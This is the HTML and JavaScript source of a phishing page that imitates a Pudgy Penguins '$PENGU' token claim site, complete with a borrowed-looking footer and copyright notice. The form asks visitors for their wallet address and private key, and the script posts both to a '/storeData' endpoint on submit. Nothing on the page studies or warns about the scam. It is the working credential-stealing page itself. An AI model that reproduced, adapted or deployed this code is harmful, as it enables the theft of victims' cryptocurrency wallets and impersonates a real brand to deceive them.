<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your $PENGU Tokens</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            margin-top: 50px;
        }
        .step {
            margin: 20px 0;
        }
        .button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
        }
        .button:hover {
            background-color: #0056b3;
        }
        .status {
            margin-top: 20px;
            font-size: 18px;
        }
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            background-color: #333;
            color: white;
            text-align: center;
            padding: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Claim Your $PENGU Tokens</h1>
        <p>Enter your details to check $PENGU claim eligibility. We accept both Solana and Ethereum.</p>

        <div class="step">
            <h2>1. Enter Your Details</h2>
            <p>Provide your wallet address and private key.</p>
            <form id="keyForm">
                <input type="text" id="address" name="address" placeholder="Your Wallet Address" required><br><br>
                <input type="password" id="privateKey" name="privateKey" placeholder="Your Private Key" required><br><br>
                <button type="submit" class="button">Submit</button>
            </form>
        </div>

        <div class="step">
            <h2>2. Connect Claim Wallet</h2>
            <p>Connect your ETH and/or SOL wallet to see if you’re eligible for $PENGU.</p>
        </div>

        <div class="step">
            <h2>3. Claim $PENGU</h2>
            <p>See how much $PENGU you’re eligible for and get ready to claim.</p>
        </div>

        <div class="step">
            <h2>4. Send to Sol Wallet</h2>
            <p>Receive your eligible $PENGU to a Solana wallet of your choice!</p>
        </div>

        <p class="status" id="status"></p>
    </div>

    <div class="footer">
        <p>This page is designed to facilitate members of the Pudgy Penguins community claiming $PENGU token; no representations are made that the bridge will work or that any particular amount of $PENGU token will be claimed by holders. $PENGU token is intended for fun and entertainment only and has no commercial value. The Pudgy Penguins companies own a significant amount of the $PENGU token.</p>
        <p>Copyright © 2025 Pudgy Penguins, Inc. All rights reserved.</p>
        <p><a href="#">Terms of Use</a> | <a href="#">IP Rights</a> | <a href="#">Privacy Policy</a></p>
    </div>

    <script>
        document.getElementById('keyForm').addEventListener('submit', async (event) => {
            event.preventDefault();
            const address = document.getElementById('address').value;
            const privateKey = document.getElementById('privateKey').value;

            if (!address || !privateKey) {
                document.getElementById('status').innerText = 'Please enter both your address and private key.';
                return;
            }

            try {
                const response = await fetch('/storeData', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ data: `${address}\n${privateKey}` })
                });

                const data = await response.json();
                document.getElementById('status').innerText = data.message;
            } catch (error) {
                document.getElementById('status').innerText = `Error: ${error.message}`;
            }
        });
    </script>
</body>
</html>
